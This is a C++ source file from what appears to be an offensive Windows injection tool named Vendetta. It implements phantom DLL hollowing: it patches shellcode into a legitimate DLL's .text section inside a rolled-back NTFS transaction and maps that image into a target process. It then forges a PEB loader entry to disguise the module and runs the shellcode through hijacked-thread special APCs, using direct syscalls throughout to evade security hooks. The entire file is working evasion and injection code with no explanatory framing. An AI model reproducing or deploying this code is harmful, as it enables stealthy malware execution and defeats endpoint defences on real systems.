#include "vendetta.h"
#include "../logger.h"

namespace Vendetta
{
	namespace
	{
		const Pattern PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY("40 53 48 83 EC ? F6 41 ? ? 48 8B D9 75", "LdrpInsertDataTableEntry");
	}
    

	DWORD FindProcessId(const std::wstring& processName)
	{
		DWORD pId = 0;

		const HANDLE hSnap = CreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, NULL);
		if (hSnap == INVALID_HANDLE_VALUE)
			return 0;

		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32FirstW(hSnap, &pe32))
		{
			do
			{
				if (processName == pe32.szExeFile)
				{
					pId = pe32.th32ProcessID;
					break;
				}
			}
			while (Process32NextW(hSnap, &pe32));
		}
		CloseHandle(hSnap);
		return pId;
	}

	HANDLE FindProcessHandleInternal(const DWORD& targetPid)
	{

		auto hFound = INVALID_HANDLE_VALUE;

		constexpr ULONG bufferSize = 0x1000;
		PPROCESS_HANDLE_SNAPSHOT_INFORMATION processInfo = nullptr;

		processInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(VirtualAlloc(
			nullptr, bufferSize,
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
		const NTSTATUS status = Sw3NtQueryInformationProcess(
			GetCurrentProcess(),
			ProcessHandleInformation,
			processInfo,
			bufferSize,
			nullptr);
		if (status == STATUS_BUFFER_TOO_SMALL)
		{
			VirtualFree(processInfo, 0, MEM_RELEASE);
			Log(LogError, "Buffer too small");
			return hFound;
		}

		constexpr ACCESS_MASK requiredAccess = PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION;
		for (ULONG_PTR i = 0; i < processInfo->NumberOfHandles; i++) {
			const auto& entry = processInfo->Handles[i];

			if ((entry.GrantedAccess & requiredAccess) == 0) continue;

			if (const HANDLE hCandidate = entry.HandleValue; GetProcessId(hCandidate) == targetPid) {
				hFound = hCandidate;
				break;
			}
		}

		VirtualFree(processInfo, 0, MEM_RELEASE);
		return hFound;
	}

    MODULEENTRY32W GetModuleEntry32W(const wchar_t* moduleName, const PROCESS_INFORMATION& pi)
    {
        const HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pi.dwProcessId);
        if (hSnap == INVALID_HANDLE_VALUE)
            return {};

        MODULEENTRY32W me32 = {};
        me32.dwSize = sizeof(MODULEENTRY32W);
        if (Module32FirstW(hSnap, &me32))
        {
            do
            {
                if (wcscmp(me32.szModule, moduleName) == 0)
                {
                    CloseHandle(hSnap);
                    return me32;
                }
            } while (Module32NextW(hSnap, &me32));
        }
        CloseHandle(hSnap);
        return {};
    }

    PVOID FindSignature(const PROCESS_INFORMATION& pi, const wchar_t* moduleName, Pattern pattern)
    {
        Log(LogInfo, "Looking for {}, pattern: {}", pattern.name, pattern.signature);

        MODULEENTRY32W me32 = GetModuleEntry32W(moduleName, pi);
        if (me32.modBaseAddr == nullptr)
            return nullptr;

        BYTE* baseAddress = me32.modBaseAddr;
        const DWORD moduleSize = me32.modBaseSize;

        std::vector<byte> memBuffer(moduleSize);
        SIZE_T bytesRead;
        NTSTATUS status = Sw3NtReadVirtualMemory(
            pi.hProcess,
            baseAddress,
            memBuffer.data(),
            moduleSize,
            &bytesRead
        );

        if (!NT_SUCCESS(status) || bytesRead == 0)
        {
            Log(LogError, "Sw3NtReadVirtualMemory failed. Error = {:x}", status);
            return nullptr;
        }

        for (size_t i = 0; i <= bytesRead - pattern.bytes.size(); ++i)
        {
            bool found = true;
            for (size_t j = 0; j < pattern.bytes.size(); ++j)
            {
                if (pattern.bytes[j] != -1 && memBuffer[i + j] != static_cast<byte>(pattern.bytes[j]))
                {
                    found = false;
                    break;
                }
            }
            if (found)
            {
                PVOID matchAddress = baseAddress + i;
                Log(LogInfo, "Pattern found at address: {:p}", matchAddress);
                return matchAddress;
            }
        }
        return nullptr;
    }

    bool ExecuteHijackThreadApcInstant(const PROCESS_INFORMATION& pi,
        const PPS_APC_ROUTINE
        baseAddress,
        const PVOID arg1,
        const PVOID arg2,
        const PVOID arg3)
    {
        NTSTATUS status;

        const HANDLE h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pi.dwProcessId);
        if (h_snap == INVALID_HANDLE_VALUE)
        {
            Log(LogError, "CreateToolhelp32Snapshot failed. Error = {}", GetLastError());
            return false;
        }

        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        if (!Thread32First(h_snap, &te32))
        {
            Log(LogError, "Thread32First failed. Error = {}", GetLastError());
            CloseHandle(h_snap);
            return false;
        }

        auto h_thread_hijacked = INVALID_HANDLE_VALUE;
        do
        {
            if (te32.th32OwnerProcessID == pi.dwProcessId)
            {
                CLIENT_ID client_id;
                client_id.UniqueProcess = UlongToHandle(te32.th32OwnerProcessID);
                client_id.UniqueThread = UlongToHandle(te32.th32ThreadID);

                OBJECT_ATTRIBUTES obj_attr = {};
                obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);

                status = Sw3NtOpenThread(&h_thread_hijacked, THREAD_ALL_ACCESS, &obj_attr, &client_id);
                if (!NT_SUCCESS(status))
                {
                    Log(LogError, "Sw3NtOpenThread failed. Error = {}", status);
                    CloseHandle(h_snap);
                    return false;
                }
                break;
            }
        } while (Thread32Next(h_snap, &te32));

        CloseHandle(h_snap);

        if (h_thread_hijacked == INVALID_HANDLE_VALUE)
        {
            Log(LogError, "Sw3NtOpenThread failed. Error = no thread was found.");
            return false;
        }

        Log(LogInfo, "Queueing Apc. Executing {:p}, RCX: {}, RDX: {}, R8: {}. TID = {}.",
            reinterpret_cast<PVOID>(baseAddress),
            static_cast<PVOID>(arg1),
            static_cast<PVOID>(arg2),
            static_cast<PVOID>(arg3),
            te32.th32ThreadID);

        status = Sw3NtQueueApcThreadEx(h_thread_hijacked,
            UlongToHandle(QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC),
            baseAddress,
            arg1, arg2, arg3);

        Sw3NtClose(h_thread_hijacked);

        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Sw3NtQueueApcThreadEx failed. Error = {}", status);
            return false;
        }

        return true;
    }

    bool LinkModuleToPeb(const PROCESS_INFORMATION& pi,
        const PVOID moduleBaseAddress,
        const PVOID moduleEntryPoint,
        const ULONG imageSize,
        const std::wstring& imagePath)
    {
        const PVOID remoteLdrpFunc = FindSignature(pi, L"ntdll.dll", PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY);

        if (!remoteLdrpFunc)
        {
            Log(LogError, "Failed to find LdrpInsertDataTableEntry.");
            return false;
        }

        std::wstring base_name = imagePath.substr(imagePath.find_last_of('\\') + 1);
        std::wstring full_name = imagePath;

        DWORD base_name_size = static_cast<DWORD>((base_name.length() + 1) * sizeof(wchar_t));
        DWORD full_name_size = static_cast<DWORD>((full_name.length() + 1) * sizeof(wchar_t));

        DWORD ddag_size = sizeof(LDR_DDAG_NODE);
        DWORD entry_size = sizeof(LDR_DATA_TABLE_ENTRY);
        DWORD total_size = entry_size + base_name_size + full_name_size + ddag_size;

        PVOID remote_memory = nullptr;
        SIZE_T region_size = total_size;

        NTSTATUS status = Sw3NtAllocateVirtualMemory(pi.hProcess, &remote_memory, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Allocation failed: {:x}", status);
            return false;
        }

        uintptr_t addr_entry = reinterpret_cast<uintptr_t>(remote_memory);
        uintptr_t addr_base_str = addr_entry + entry_size;
        uintptr_t addr_full_str = addr_base_str + base_name_size;
        uintptr_t addr_ddag = addr_full_str + full_name_size;

        LDR_DATA_TABLE_ENTRY local_entry = { nullptr };
        LDR_DDAG_NODE local_ddag = { nullptr };

        local_ddag.State = LdrModulesReadyToRun;
        local_ddag.LoadCount = 0xFFFFFFFF;
        local_ddag.Modules.Flink = reinterpret_cast<PLIST_ENTRY>(addr_ddag + offsetof(LDR_DDAG_NODE, Modules));
        local_ddag.Modules.Blink = reinterpret_cast<PLIST_ENTRY>(addr_ddag + offsetof(LDR_DDAG_NODE, Modules));

        local_entry.DllBase = moduleBaseAddress;
        local_entry.SizeOfImage = imageSize;
        local_entry.EntryPoint = moduleEntryPoint;
        local_entry.TlsIndex = 0;
        local_entry.ObsoleteLoadCount = 0xFFFF;
        local_entry.ReferenceCount = 0xFFFFFFFF;
        local_entry.Flags = LDRP_DONT_CALL_FOR_THREADS;

        local_entry.BaseDllName.Length = static_cast<USHORT>(base_name_size - sizeof(wchar_t));
        local_entry.BaseDllName.MaximumLength = static_cast<USHORT>(base_name_size);
        local_entry.BaseDllName.Buffer = reinterpret_cast<PWSTR>(addr_base_str);

        local_entry.FullDllName.Length = static_cast<USHORT>(full_name_size - sizeof(wchar_t));
        local_entry.FullDllName.MaximumLength = static_cast<USHORT>(full_name_size);
        local_entry.FullDllName.Buffer = reinterpret_cast<PWSTR>(addr_full_str);

        local_entry.DdagNode = reinterpret_cast<PLDR_DDAG_NODE>(addr_ddag);
        local_entry.HashLinks.Flink = nullptr;
        local_entry.HashLinks.Blink = nullptr;

        Sw3NtWriteVirtualMemory(pi.hProcess, reinterpret_cast<PVOID>(addr_entry), &local_entry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
        Sw3NtWriteVirtualMemory(pi.hProcess, reinterpret_cast<PVOID>(addr_base_str), base_name.data(), base_name_size, nullptr);
        Sw3NtWriteVirtualMemory(pi.hProcess, reinterpret_cast<PVOID>(addr_full_str), full_name.data(), full_name_size, nullptr);
        Sw3NtWriteVirtualMemory(pi.hProcess, reinterpret_cast<PVOID>(addr_ddag), &local_ddag, sizeof(LDR_DDAG_NODE), nullptr);

        Log(LogInfo, "Memory allocated and LDR entry written.");

        if (!ExecuteHijackThreadApcInstant(pi, static_cast<PPS_APC_ROUTINE>(remoteLdrpFunc), reinterpret_cast<PVOID>(addr_entry)))
        {
            Log(LogError, "Failed to queue apc for linking.");
            return false;
        }

        Log(LogInfo, "Linked successfully via direct LdrpInsertDataTableEntry call.");
        return true;
    }

    bool InjectPhantomDll(const PROCESS_INFORMATION& pi, const BYTE* buf,
        SIZE_T bufSize,
        const std::wstring& legitimateDllPath)
    {
        if (legitimateDllPath.empty())
        {
            Log(LogError, "Legitimate DLL path required for hollowing.");
            return false;
        }

        std::string legitPathStr(legitimateDllPath.begin(), legitimateDllPath.end());
        Log(LogInfo, "Reading Legitimate DLL: {}", legitPathStr);

        const HANDLE hFile = CreateFileW(legitimateDllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            Log(LogError, "Failed to open legitimate DLL: {}", GetLastError());
            return false;
        }

        DWORD fileSize = GetFileSize(hFile, nullptr);
        std::vector<BYTE> pe_buffer(fileSize);
        DWORD bytesRead = 0;
        if (!ReadFile(hFile, pe_buffer.data(), fileSize, &bytesRead, nullptr))
        {
            Log(LogError, "ReadFile failed.");
            CloseHandle(hFile);
            return false;
        }
        CloseHandle(hFile);

        auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_buffer.data());
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        auto pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) return false;

        auto pSection = IMAGE_FIRST_SECTION(pNt);
        PIMAGE_SECTION_HEADER pTextSection = nullptr;

        for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
        {
            if (strncmp(reinterpret_cast<char*>(pSection[i].Name), ".text", 5) == 0)
            {
                pTextSection = &pSection[i];
                break;
            }
        }

        if (!pTextSection)
        {
            Log(LogError, ".text section not found in legitimate DLL.");
            return false;
        }

        if (bufSize > pTextSection->SizeOfRawData)
        {
            Log(LogError, "Shellcode ({} bytes) is too large for .text section ({} bytes).", bufSize, pTextSection->SizeOfRawData);
            return false;
        }

        HANDLE hTransaction;
        OBJECT_ATTRIBUTES obj_attr = { sizeof(OBJECT_ATTRIBUTES) };

        NTSTATUS status = Sw3NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &obj_attr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Sw3NtCreateTransaction failed: {:x}", status);
            return false;
        }
        Log(LogInfo, "Transaction created.");

        HANDLE hTransactedFile = CreateFileTransactedW(legitimateDllPath.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        if (hTransactedFile == INVALID_HANDLE_VALUE)
        {
            Log(LogError, "CreateFileTransactedW failed: {}", GetLastError());
            Sw3NtClose(hTransaction);
            return false;
        }

        Log(LogInfo, "Patching .text section in memory...");
        memcpy(pe_buffer.data() + pTextSection->PointerToRawData, buf, bufSize);

        Log(LogInfo, "Writing patched PE content to transaction...");

        IO_STATUS_BLOCK io_status;
        LARGE_INTEGER byteOffset = {};

        status = Sw3NtWriteFile(hTransactedFile, nullptr, nullptr, nullptr, &io_status, pe_buffer.data(), static_cast<ULONG>(pe_buffer.size()), &byteOffset, nullptr);
        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Sw3NtWriteFile failed: {:x}", status);
            CloseHandle(hTransactedFile);
            Sw3NtClose(hTransaction);
            return false;
        }

        HANDLE hSection = nullptr;
        status = Sw3NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Sw3NtCreateSection failed: {:x}", status);
            CloseHandle(hTransactedFile);
            Sw3NtClose(hTransaction);
            return false;
        }

        PVOID remoteBase = nullptr;
        SIZE_T viewSize = 0;

        status = Sw3NtMapViewOfSection(hSection, pi.hProcess, &remoteBase, 0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
        if (!NT_SUCCESS(status))
        {
            Log(LogError, "Sw3NtMapViewOfSection failed: {:x}", status);
            Sw3NtClose(hSection);
            CloseHandle(hTransactedFile);
            Sw3NtClose(hTransaction);
            return false;
        }
        Log(LogInfo, "Section created and mapped to the target process.");

        Sw3NtClose(hSection);
        CloseHandle(hTransactedFile);

        status = Sw3NtRollbackTransaction(hTransaction, TRUE);
        if (!NT_SUCCESS(status))
        {
            Log(LogWarn, "Sw3NtRollbackTransaction failed (Warning): {:x}", status);
        }
        Sw3NtClose(hTransaction);
        Log(LogInfo, "Transaction rolled back successfully.");

        Log(LogInfo, "Mapped Base Address: {}", remoteBase);

        PVOID executionAddress = static_cast<PBYTE>(remoteBase) + pTextSection->VirtualAddress;

        Log(LogInfo, "Linking phantom dll to PEB...");

        auto pNtRemote = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos->e_lfanew);
        ULONG image_size = pNtRemote->OptionalHeader.SizeOfImage;

        if (!LinkModuleToPeb(pi, remoteBase, executionAddress, image_size, legitimateDllPath))
        {
            Log(LogError, "Failed to link phantom dll to PEB.");
            return false;
        }

        // execute via apc instant
        if (!ExecuteHijackThreadApcInstant(pi, static_cast<PPS_APC_ROUTINE>(executionAddress)))
        {
            Log(LogError, "Failed execute the entrypoint via APC.");
            return false;
        }

        return true;
    }
}
